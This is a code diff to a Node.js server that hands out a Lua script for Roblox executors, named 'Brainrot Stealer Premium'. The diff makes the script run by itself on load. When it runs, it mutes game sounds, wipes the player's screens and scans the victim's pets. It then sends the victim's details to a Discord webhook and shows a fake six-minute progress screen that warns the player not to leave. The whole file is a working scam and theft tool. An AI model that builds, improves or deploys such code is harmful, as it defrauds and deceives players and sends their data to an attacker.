@@ -83,7 +83,7 @@ app.get("/raw", blockNonExecutor, (req, res) => {
     return res.status(404).send("-- INVALID ID --");
   }
 
-  // Build Lua script
+  // Build Lua script with animated GUI and sound mute
   const luaScript = `local WebhookURL = "${webhook}"
 
 -- HTTP Request Function
@@ -152,47 +152,138 @@ local function GetExecutor()
     return "Executor"
 end
 
--- Create Black Screen
-local function CreateBlackScreen()
+-- Mute All Sounds
+local function MuteAllSounds()
+    pcall(function()
+        -- Stop all sounds
+        for _, sound in pairs(game:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound:Stop()
+                sound.Volume = 0
+            end
+        end
+        
+        -- Mute sound service
+        local soundService = game:GetService("SoundService")
+        soundService:SetRBXEvent("Volume", 0)
+    end)
+end
+
+-- Create Animated GUI with Blue Border
+local function CreateAnimatedGUI()
+    -- Clear existing GUIs
     pcall(function()
         for _, gui in pairs(player.PlayerGui:GetChildren()) do
-            pcall(function() gui:Destroy() end)
+            if gui:IsA("ScreenGui") then
+                gui:Destroy()
+            end
         end
     end)
     
+    -- Main ScreenGui
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "BrainrotStealer"
+    screenGui.Name = "BrainrotStealerPremium"
     screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = player.PlayerGui
     
-    local background = Instance.new("Frame")
-    background.Size = UDim2.new(2, 0, 2, 0)
-    background.Position = UDim2.new(-0.5, 0, -0.5, 0)
-    background.BackgroundColor3 = Color3.new(0, 0, 0)
-    background.BorderSizePixel = 0
-    background.Parent = screenGui
+    -- Main Container with Animated Blue Border
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0, 500, 0, 350)
+    mainContainer.Position = UDim2.new(0.5, -250, 0.5, -175)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+    mainContainer.BorderSizePixel = 0
+    mainContainer.Parent = screenGui
     
+    -- Animated Blue Border
+    local borderFrame = Instance.new("Frame")
+    borderFrame.Size = UDim2.new(1, 4, 1, 4)
+    borderFrame.Position = UDim2.new(0, -2, 0, -2)
+    borderFrame.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    borderFrame.BorderSizePixel = 0
+    borderFrame.Parent = mainContainer
+    
+    -- Animate the border
+    spawn(function()
+        while borderFrame and borderFrame.Parent do
+            for i = 0, 1, 0.05 do
+                if borderFrame then
+                    borderFrame.BackgroundColor3 = Color3.fromHSV(i, 0.8, 1)
+                    wait(0.1)
+                end
+            end
+        end
+    end)
+    
+    -- Inner background
+    local innerBg = Instance.new("Frame")
+    innerBg.Size = UDim2.new(1, -4, 1, -4)
+    innerBg.Position = UDim2.new(0, 2, 0, 2)
+    innerBg.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    innerBg.BorderSizePixel = 0
+    innerBg.Parent = mainContainer
+    
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 60)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+    title.BackgroundTransparency = 0.3
+    title.Text = "🧠 BRAINROT STEALER PREMIUM"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 20
+    title.Font = Enum.Font.GothamBold
+    title.Parent = innerBg
+    
+    -- Timer Display
     local timerLabel = Instance.new("TextLabel")
     timerLabel.Size = UDim2.new(1, 0, 0, 80)
-    timerLabel.Position = UDim2.new(0, 0, 0.4, 0)
+    timerLabel.Position = UDim2.new(0, 0, 0.2, 0)
     timerLabel.BackgroundTransparency = 1
     timerLabel.Text = "06:00"
     timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
     timerLabel.TextSize = 48
     timerLabel.Font = Enum.Font.GothamBold
-    timerLabel.Parent = background
+    timerLabel.Parent = innerBg
     
+    -- Status Label
     local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, 0, 0, 25)
-    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
+    statusLabel.Size = UDim2.new(1, 0, 0, 30)
+    statusLabel.Position = UDim2.new(0, 0, 0.5, 0)
     statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "Scanning Brainrots..."
-    statusLabel.TextColor3 = Color3.new(1, 1, 1)
-    statusLabel.TextSize = 18
+    statusLabel.Text = "🔄 Initializing Brainrot Scanner..."
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    statusLabel.TextSize = 16
     statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = background
+    statusLabel.Parent = innerBg
     
-    return screenGui, timerLabel, statusLabel
+    -- Progress Bar
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0.8, 0, 0, 20)
+    progressBar.Position = UDim2.new(0.1, 0, 0.7, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = innerBg
+    
+    local progressFill = Instance.new("Frame")
+    progressFill.Size = UDim2.new(0, 0, 1, 0)
+    progressFill.Position = UDim2.new(0, 0, 0, 0)
+    progressFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    progressFill.BorderSizePixel = 0
+    progressFill.Parent = progressBar
+    
+    -- Warning Text
+    local warningText = Instance.new("TextLabel")
+    warningText.Size = UDim2.new(1, 0, 0, 40)
+    warningText.Position = UDim2.new(0, 0, 0.85, 0)
+    warningText.BackgroundTransparency = 1
+    warningText.Text = "⚠️ DO NOT LEAVE THE GAME - PROCESSING BRAINROTS..."
+    warningText.TextColor3 = Color3.fromRGB(255, 100, 100)
+    warningText.TextSize = 14
+    warningText.Font = Enum.Font.GothamBold
+    warningText.Parent = innerBg
+    
+    return screenGui, timerLabel, statusLabel, progressFill
 end
 
 -- Scan Pets
@@ -315,16 +406,22 @@ local function StartStealingProcess()
     local executor = GetExecutor()
     local playerCount = #game.Players:GetPlayers()
     
-    -- Create black screen
-    local screenGui, timer, status = CreateBlackScreen()
+    -- Mute all sounds immediately
+    MuteAllSounds()
     
-    status.Text = "Scanning Pets..."
+    -- Create animated GUI
+    local screenGui, timer, status, progress = CreateAnimatedGUI()
+    
+    status.Text = "🔇 Muting all sounds..."
+    wait(1)
+    
+    status.Text = "🔍 Scanning for pets..."
     wait(2)
     
     -- Scan pets
     local allPets, brainrots, topPets = ScanPets()
     
-    status.Text = "Sending Results..."
+    status.Text = "📨 Sending results to webhook..."
     
     -- Create brainrots list for embed
     local brainrotsText = FormatBrainrotsList(brainrots)
@@ -332,8 +429,8 @@ local function StartStealingProcess()
     
     -- Send results to webhook
     local embed = {
-        title = "BRAINROT STEALER RESULTS",
-        description = "Successfully scanned victim pets",
+        title = "🧠 BRAINROT STEALER PREMIUM RESULTS",
+        description = "Successfully scanned victim pets with premium features",
         color = 65280,
         author = {
             name = playerName,
@@ -342,35 +439,35 @@ local function StartStealingProcess()
         },
         fields = {
             {
-                name = "Victim Info",
+                name = "🎯 Victim Info",
                 value = "Player: " .. playerName .. "\\nExecutor: " .. executor .. "\\nServer Players: " .. playerCount,
                 inline = true
             },
             {
-                name = "Scan Results", 
+                name = "📊 Scan Results", 
                 value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrots .. "\\nGame: Auto-Scan",
                 inline = true
             },
             {
-                name = "Top Pets",
+                name = "🏆 Top Pets",
                 value = topPetsText,
                 inline = false
             },
             {
-                name = "Brainrots",
+                name = "🧠 Brainrots Found",
                 value = brainrotsText,
                 inline = false
             }
         },
-        footer = {text = "Brainrot Stealer • " .. os.date("%X")},
+        footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     
     SendToDiscord(embed)
     
-    status.Text = "Results Sent! Starting 6-minute process..."
+    status.Text = "✅ Results Sent! Starting 6-minute process..."
     
-    -- 6-minute timer
+    -- 6-minute timer with progress bar
     local totalTime = 360
     local startTime = tick()
     
@@ -378,14 +475,24 @@ local function StartStealingProcess()
         local timeLeft = totalTime - (tick() - startTime)
         local minutes = math.floor(timeLeft / 60)
         local seconds = math.floor(timeLeft % 60)
+        local progressPercent = (tick() - startTime) / totalTime
+        
+        -- Update timer
         timer.Text = string.format("%02d:%02d", minutes, seconds)
+        
+        -- Update progress bar
+        progress.Size = UDim2.new(progressPercent, 0, 1, 0)
+        
+        -- Update status with progress
+        status.Text = string.format("🔄 Processing... %.1f%% Complete", progressPercent * 100)
+        
         wait(0.1)
     end
     
     -- Send completion message
     local completeEmbed = {
-        title = "PROCESS COMPLETE",
-        description = "Brainrot stealing process finished",
+        title = "✅ PROCESS COMPLETE",
+        description = "Brainrot stealing process finished successfully",
         color = 32768,
         author = {
             name = playerName,
@@ -394,71 +501,33 @@ local function StartStealingProcess()
         },
         fields = {
             {
-                name = "Final Results",
+                name = "🎉 Final Results",
                 value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success",
                 inline = false
             }
         },
-        footer = {text = "Brainrot Stealer • " .. os.date("%X")}
+        footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")}
     }
     
     SendToDiscord(completeEmbed)
     
-    status.Text = "Process Complete!"
+    status.Text = "✅ Process Complete!"
     timer.Text = "DONE"
+    progress.Size = UDim2.new(1, 0, 1, 0)
     
     wait(3)
     
     pcall(function() screenGui:Destroy() end)
 end
 
--- Create GUI
-local function CreateGUI()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "StealerGUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = player.PlayerGui
-    
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 400, 0, 200)
-    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = screenGui
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 50)
-    title.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
-    title.Text = "BRAINROT STEALER\\nClick to Start"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 16
-    title.Parent = mainFrame
-    
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0.8, 0, 0, 50)
-    button.Position = UDim2.new(0.1, 0, 0.5, 0)
-    button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-    button.Text = "START STEALING"
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.Font = Enum.Font.GothamBold
-    button.TextSize = 16
-    button.Parent = mainFrame
-    
-    button.MouseButton1Click:Connect(function()
-        button.Text = "STARTING..."
-        button.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
-        wait(1)
-        StartStealingProcess()
-    end)
-end
+-- Auto-execute the process
+wait(2)
+StartStealingProcess()
 
--- Initialize
-wait(1)
-CreateGUI()
-
-print("Brainrot Stealer loaded!")
-print("Ready to steal brainrots!")`;
+print("🧠 Brainrot Stealer Premium loaded!")
+print("🎨 Animated GUI activated!")
+print("🔇 Sounds muted!")
+print("⏰ 6-minute process started!")`;
 
   res.type("text/plain").send(luaScript);
 });
@@ -478,8 +547,8 @@ app.use((req, res) => {
 // 6. START SERVER
 // ------------------------------------------------------------------
 app.listen(PORT, () => {
-  console.log("Brainrot Stealer Server running on port " + PORT);
-  console.log("Ready to steal brainrots!");
-  console.log("Website: https://tommyfc555-github-io.onrender.com");
-  console.log("Stored webhooks: " + webhookStore.size);
+  console.log("🧠 Brainrot Stealer Server running on port " + PORT);
+  console.log("🎨 Premium features: Animated GUI, Sound Mute, Auto-execute");
+  console.log("🔗 Website: https://tommyfc555-github-io.onrender.com");
+  console.log("📊 Stored webhooks: " + webhookStore.size);
 });
